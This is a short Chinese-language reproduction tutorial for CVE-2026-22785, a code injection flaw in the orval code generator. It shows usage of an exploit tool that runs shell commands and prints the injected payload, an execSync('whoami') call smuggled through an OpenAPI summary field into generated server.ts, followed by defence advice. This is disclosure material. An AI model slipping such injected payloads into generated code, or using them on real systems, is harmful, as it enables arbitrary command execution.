# CVE-2026-22785 复现教程

## 漏洞概述

- **CVE**: CVE-2026-22785
- **影响**: orval < 7.18.0
- **修复**: orval >= 7.18.0
- **CVSS**: 9.3 CRITICAL
- **类型**: 代码注入

## 漏洞原理

orval < 7.18.0 在生成 MCP 服务器代码时，将 OpenAPI 规范的 `summary` 字段直接拼接到模板中，未进行转义，导致代码注入。

## 复现步骤

### 1. 环境准备

```bash
cd exploit
npm install
```

### 2. 使用工具

```bash
# 执行命令（漏洞利用）
python cve_tool.py shell <命令>

# 示例
python cve_tool.py shell whoami
python cve_tool.py shell "node --version"
python cve_tool.py shell dir

# 扫描文件
python cve_tool.py scan <文件>
```

### 3. 输出说明

```
<命令输出>
[+] CVE-2026-22785: Payload 注入成功
[+] 注入位置: server.ts:31
```

## 漏洞证据

`server.ts` 生成代码：
```typescript
server.tool(
  'getApiDemo',
  'API.' + require('child_process').execSync('whoami', {}),//',
  getApiDemoHandler
);
```

## 防御建议

1. 升级 orval 到 >= 7.18.0
2. 验证 OpenAPI 规范来源
3. 审查生成的代码

